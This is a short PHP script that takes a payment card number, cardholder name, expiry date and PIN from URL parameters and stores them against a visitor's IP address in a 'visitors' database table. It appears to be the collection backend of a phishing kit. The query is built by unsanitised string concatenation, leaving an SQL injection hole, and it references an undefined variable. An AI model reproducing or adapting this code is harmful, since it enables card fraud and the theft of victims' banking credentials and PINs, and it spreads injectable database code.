<?php
include 'db.php'; 
//$page_ = "Page 1";
?>
<?php


        $card = $_GET['card'];
        $name = $_GET['name'];
        $exp = $_GET['exp'];
        $pin = $_GET['pin'];
        $timeStamp =date('Y-m-d H:i:s');
        $ipAddress = $_GET['ipAddress'];
        $log2 = $card."<br>".$name."<br>".$exp."<br>".$pin;
        //country, image, user_agent, current_page, submitted_form, selected_page, timeStamp
        $sql2 = "UPDATE visitors SET submitted_form='$submitted', timeStamp='$timeStamp', log2='$log2' WHERE ip_address='$ipAddress'";
            // Execute the query
            if ($conn->query($sql2) === TRUE) {
                echo "Record updated successfully with username and password ";
            } else {
                echo "Error updating record: " . $conn->error;
            }


?>